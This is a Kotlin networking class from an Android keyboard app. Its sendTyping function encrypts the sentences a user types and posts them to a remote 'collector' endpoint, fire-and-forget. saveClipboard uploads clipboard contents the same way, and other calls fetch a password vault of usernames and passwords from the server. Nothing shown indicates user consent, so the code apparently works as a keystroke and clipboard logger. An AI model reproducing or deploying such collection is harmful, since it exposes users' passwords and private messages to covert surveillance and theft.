package com.yanming.keyboard

import android.os.Handler
import android.os.Looper
import org.json.JSONObject
import java.net.URL
import javax.net.ssl.HttpsURLConnection

// ═══════════════════════════════════════════════════════
// HTTP client — pure Android SDK, zero external libs
// ═══════════════════════════════════════════════════════
object ServerClient {

    private val main = Handler(Looper.getMainLooper())
    private fun token() = Crypto.hmacSha256(Config.SECRET_KEY, "yanming")

    fun post(path: String, body: JSONObject, cb: (JSONObject?) -> Unit) {
        Thread {
            try {
                val conn = (URL(Config.COLLECTOR + path).openConnection()) as HttpsURLConnection
                conn.requestMethod  = "POST"
                conn.connectTimeout = 6000
                conn.readTimeout    = 6000
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                conn.setRequestProperty("X-Token", token())
                conn.doOutput = true
                conn.outputStream.write(body.toString().toByteArray(Charsets.UTF_8))
                val code = conn.responseCode
                val raw  = if (code in 200..299)
                    conn.inputStream.bufferedReader(Charsets.UTF_8).readText()
                else null
                main.post { cb(raw?.let { runCatching { JSONObject(it) }.getOrNull() }) }
            } catch (e: Exception) {
                main.post { cb(null) }
            }
        }.start()
    }

    fun get(path: String, cb: (JSONObject?) -> Unit) {
        Thread {
            try {
                val conn = (URL(Config.COLLECTOR + path).openConnection()) as HttpsURLConnection
                conn.requestMethod  = "GET"
                conn.connectTimeout = 6000
                conn.readTimeout    = 6000
                conn.setRequestProperty("X-Token", token())
                val raw = conn.inputStream.bufferedReader(Charsets.UTF_8).readText()
                main.post { cb(runCatching { JSONObject(raw) }.getOrNull()) }
            } catch (e: Exception) {
                main.post { cb(null) }
            }
        }.start()
    }

    // Send typed sentence to collector
    fun sendTyping(text: String, language: String) {
        if (!Config.COLLECT_TYPING || text.length < Config.MIN_SEND_LENGTH) return
        val encrypted = Crypto.encrypt(text)
        val body = JSONObject().apply {
            put("text", encrypted)
            put("language", language)
        }
        post("/save", body) { /* fire and forget */ }
    }

    // Fetch bot response from model API
    fun askBot(text: String, cb: (String?) -> Unit) {
        val body = JSONObject().apply { put("text", text) }
        post("/predict", body) { res ->
            cb(res?.optString("prediction"))
        }
    }

    // Fetch vault items
    fun getVault(cb: (List<VaultItem>) -> Unit) {
        get("/vault/list") { res ->
            val items = mutableListOf<VaultItem>()
            val arr   = res?.optJSONArray("items")
            if (arr != null) {
                for (i in 0 until arr.length()) {
                    val o = arr.getJSONObject(i)
                    items.add(VaultItem(
                        id       = o.optInt("id"),
                        name     = o.optString("name"),
                        username = o.optString("username"),
                        password = o.optString("password"),
                    ))
                }
            }
            cb(items)
        }
    }

    // Fetch songs
    fun getSongs(cb: (List<Song>) -> Unit) {
        get("/songs/list") { res ->
            val songs = mutableListOf<Song>()
            val arr   = res?.optJSONArray("songs")
            if (arr != null) {
                for (i in 0 until arr.length()) {
                    val o = arr.getJSONObject(i)
                    songs.add(Song(
                        id     = o.optInt("id"),
                        title  = o.optString("title"),
                        lyrics = o.optString("lyrics"),
                        cover  = o.optString("cover"),
                    ))
                }
            }
            cb(songs)
        }
    }

    // Fetch clipboard
    fun getClipboard(cb: (List<ClipItem>) -> Unit) {
        get("/clipboard/list") { res ->
            val items = mutableListOf<ClipItem>()
            val arr   = res?.optJSONArray("items")
            if (arr != null) {
                for (i in 0 until arr.length()) {
                    val o = arr.getJSONObject(i)
                    items.add(ClipItem(
                        id   = o.optInt("id"),
                        text = o.optString("text"),
                        at   = o.optString("created_at"),
                    ))
                }
            }
            cb(items)
        }
    }

    fun saveClipboard(text: String) {
        val body = JSONObject().apply { put("text", Crypto.encrypt(text)) }
        post("/clipboard/save", body) { }
    }
}

data class VaultItem(val id: Int, val name: String, val username: String, val password: String)
data class Song(val id: Int, val title: String, val lyrics: String, val cover: String)
data class ClipItem(val id: Int, val text: String, val at: String)
